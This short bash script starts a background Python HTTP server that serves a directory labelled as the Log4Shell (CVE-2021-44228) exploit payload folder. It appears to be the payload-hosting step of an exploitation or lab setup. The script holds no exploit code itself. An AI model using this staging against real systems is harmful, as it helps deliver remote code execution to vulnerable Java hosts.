#!/usr/bin/env bash
set -euo pipefail

PAYLOAD_DIR="/opt/log4shell/CVE-2021-44228/exploit"
LOG_DIR="/opt/log4shell/logs"
mkdir -p "$LOG_DIR"

cd "$PAYLOAD_DIR"

if pgrep -f "python3 -m http.server 8000" >/dev/null 2>&1; then
  echo "[=] HTTP server already running on :8000"
  exit 0
fi

echo "[*] Starting Python HTTP server on :8000 serving $PAYLOAD_DIR ..."
nohup python3 -m http.server 8000 >"$LOG_DIR/http-server.log" 2>&1 &

echo "[*] Logs: $LOG_DIR/http-server.log"
